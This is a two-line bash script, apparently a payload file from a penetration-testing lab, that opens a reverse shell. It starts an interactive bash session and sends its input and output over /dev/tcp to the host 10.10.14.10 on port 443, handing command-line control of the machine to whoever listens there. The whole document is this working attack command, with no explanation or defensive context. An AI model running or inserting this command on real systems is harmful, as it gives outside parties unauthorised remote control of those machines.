#!/bin/bash
bash -i >& /dev/tcp/10.10.14.10/443 0>&1
